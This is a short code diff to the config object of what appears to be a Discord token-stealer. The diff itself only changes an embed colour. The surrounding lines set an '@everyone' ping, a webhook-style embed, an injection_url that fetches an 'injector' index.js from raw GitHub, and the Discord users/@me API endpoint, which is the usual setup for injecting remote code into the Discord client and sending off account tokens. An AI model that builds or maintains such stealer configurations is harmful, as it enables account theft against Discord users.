@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone', 
   embed_name: ' ', 
   embed_icon: ' ',
-  embed_color: 000000, 
+  embed_color: 3092790, 
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
